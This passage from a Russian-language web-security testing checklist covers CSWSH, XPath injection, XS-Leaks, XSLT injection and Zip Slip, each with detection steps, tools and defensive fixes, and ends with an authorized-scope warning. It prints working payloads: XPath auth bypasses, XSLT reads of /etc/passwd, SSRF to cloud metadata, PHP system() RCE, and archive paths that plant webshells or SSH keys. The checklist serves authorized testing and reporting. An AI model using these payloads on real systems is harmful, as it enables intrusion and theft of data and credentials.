- [ ] **CSWSH**: handshake опирается только на cookies, `Origin` не проверяется → со своего домена `new WebSocket('wss://target/...')` с cookies жертвы, читать/слать сообщения
- [ ] PoC-страница: открыть ws, `onmessage` → эксфильтровать данные на свой сервер
- [ ] Message tampering: инъекции в данные сообщений (XSS/SQLi/etc. в WS-канале)
- [ ] Отсутствие auth на уровне сообщений (доступ к чужим данным)

**Инструменты:** Burp (WebSocket history/Repeater), `ws-harness`, ручной JS
**Защита (для репорта):** валидация `Origin` на handshake; CSRF-токен в апгрейд-запросе; аутентификация и авторизация на уровне сообщений; не доверять WS-вводу

---

## 36. XPATH Injection

**Recon / где искать**
- [ ] Точки, ходящие в XML/XPath-запрос (login по XML-хранилищу, поиск в XML)

**Детект / эксплуатация**
- [ ] Спецсимволы `'`, `"`, `(`, `)` → ошибка/изменение
- [ ] Auth bypass: `' or '1'='1`, `') or ('1'='1`, `' or 1=1 or ''='`
- [ ] Blind boolean посимвольно: `substring(//user[1]/password,1,1)='a'`, `string-length(...)`
- [ ] Перечисление структуры: `count(//user)`, `name(//*[1])`

**Инструменты:** **xcat**, ручной
**Защита (для репорта):** параметризованный XPath / precompiled с переменными; экранирование; валидация ввода

---

## 37. XS-Leaks

**Recon / где искать**
- [ ] Cross-origin эндпоинты, отвечающие по-разному в зависимости от состояния пользователя (logged-in, есть ли результат поиска, владелец ли)
- [ ] Возможность встроить цель в `<iframe>` / открыть через `window.open`

**Детект / эксплуатация**
- [ ] **Frame counting**: `win = window.open(target); win.length` → число фреймов выдаёт состояние (есть результаты / залогинен)
- [ ] **Timing**: измерить `performance.now()` вокруг загрузки cross-origin ресурса (cache vs no-cache, user exists)
- [ ] **Error events**: `img.onload`/`onerror`, `<script>`/`<link>` onerror → существование ресурса/состояние
- [ ] **CSP redirect detection**: CSP на своей странице, разрешающий только конкретный URL → блок = был редирект (logged-in?)
- [ ] **postMessage** broadcast — перехват непреднамеренно широковещательных сообщений
- [ ] **CSS injection XS-Leak** (2025) / focus-события для проба ID

**Инструменты:** ручной JS, XS-Leaks Wiki PoC
**Защита (для репорта):** `Cross-Origin-Opener-Policy: same-origin`; `Cross-Origin-Resource-Policy`; **Fetch Metadata** (`Sec-Fetch-*`); единообразные ответы (uniform 404, padding размера, стабильные редиректы); `SameSite` cookies

---

## 38. XSLT Injection

**Recon / где искать**
- [ ] Точки XSLT-трансформации (XML→HTML/PDF/документ), где ввод попадает в stylesheet или входной XML

**Детект / эксплуатация**
- [ ] Версия/движок: `<xsl:value-of select="system-property('xsl:version')"/>`, `'vendor'`, `'product-version'`
- [ ] File read: `<xsl:value-of select="unparsed-text('/etc/passwd')"/>`, `document('/etc/passwd')`
- [ ] SSRF: `document('http://collab/')`, `document('http://169.254.169.254/...')`
- [ ] RCE через extension functions: PHP `php:function('system','id')`, Java/.NET extensions (если включены)

**Инструменты:** ручной
**Защита (для репорта):** отключить extension functions и `document()`/external; sandbox-процессор; валидация; обновление libxslt/Saxon

---

## 39. Zip Slip

**Recon / где искать**
- [ ] Функции распаковки загружаемых архивов (ZIP/TAR/JAR/RAR): импорт, бэкап-restore, плагины, темы

**Детект / эксплуатация**
- [ ] Создать архив с traversal-именами записей: `../../../../var/www/html/shell.php`
- [ ] Цели записи: webroot (webshell), cron, `~/.ssh/authorized_keys`, конфиги, автозапуск
- [ ] Symlink-варианты в TAR; Windows: `..\\..\\`
- [ ] Подтвердить запись вне директории извлечения
- [ ] Реальный кейс: **CVE-2024-57726** (SimpleHelp), внесён в CISA KEV (янв 2025)

**Инструменты:** `evilarc`, `slipit`, ручная сборка архива
**Защита (для репорта):** канонизация и проверка, что итоговый путь внутри целевой директории; отклонять `../` и абсолютные пути в именах записей; не доверять именам из архива

---

> ⚠️ **Scope.** RCE-векторы (LaTeX `\write18`, file upload shells, Java RMI/JMX, XSLT extensions, dependency confusion с реальной нагрузкой), DoS (ReDoS, decompression bombs) и mass-перебор — разрушительны/нагрузочны. Только в рамках авторизованного scope; многие программы запрещают DoS, RCE-эксплуатацию без согласования и mass account creation. Dependency confusion и prompt injection тестировать максимально безопасными пробниками (OAST/канарейки), без вредоносной нагрузки.
